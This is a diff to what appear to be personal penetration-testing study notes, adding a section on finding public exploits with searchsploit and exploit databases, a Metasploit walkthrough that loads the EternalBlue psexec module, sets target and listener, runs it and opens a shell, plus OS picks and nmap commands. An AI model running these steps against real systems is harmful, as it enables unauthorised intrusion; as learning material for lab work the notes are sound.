@@ -127,6 +127,63 @@ snmpwalk -v 2c -c private  10.129.42.253
 
 onesixtyone -c dict.txt [IP] : Brute force tool
 
+### Public Exploits
+
+After finding out a tech stacks and services, version running on server, the next step is that check in search engine (google,bing...) whether having an vulnerability declared or not with keyword "[app/service name] [version] exploit"
+
+Or we can use an special tools name Searchsploit: 
+```
+$ sudo apt install -y exploitdb
+```
+
+then search by using cmd: 
+```
+$ searchsploit [app/service name] [version]
+```
+
+Or checkout on online DB: https://www.exploit-db.com/ and https://www.rapid7.com/db/
+
+Metasploit Framework (MSF)
+
+MSF is a powerful framework, which allows to exploit testing, integrate robust features and tools such as run script to collect info, check target server has vulnerability or not,.... It can run on Windows, Linux, MacOS
+
+```
+// startup 
+$ msfconsole
+
+// search exploit
+$ search exploit eternalblue
+
+// choose module 0
+$ use 0
+
+// choose module
+$ use exploit/windows/smb/ms17_010_psexec (or specific path)
+
+// show options
+$ show options
+
+// set target IP
+set RHOSTS [target IP]
+
+// set target port
+set RPORT 30570
+
+// set attack IP
+set LHOST tun0
+
+// check exploit
+$ check
+
+// take control
+$ exploit
+// or
+$ run
+
+// enter cli
+$ shell
+```
+
 ### Attack Active Directory & Internal network
 
 NetExec / CrackMapExec: password spraying, list share SMB, check admin privilenge, execute remotely cmd
@@ -295,6 +352,16 @@ more info: https://tmuxcheatsheet.com/
 
 https://vimsheet.com/
 
+### OS
+
+Kali linux: Industry Standard
+
+Parrot OS (Security Edition): Recommend to use
+
+### Metasploit Framework (MSF)
+
+https://www.metasploit.com/
+
 # useful commands
 
 netcat [IP] [port][ get banner string of server
@@ -313,6 +380,8 @@ nmap --script [script name] -p[port] [host/ip] : run with specific script
 nmap -sCV [IP] : combine 2 above cmds
 
 nmap -sCV -p- [IP] : scan all 65,535 TCP ports
+
+nmap -sV -p [port] [IP] -Pn
 
 
 
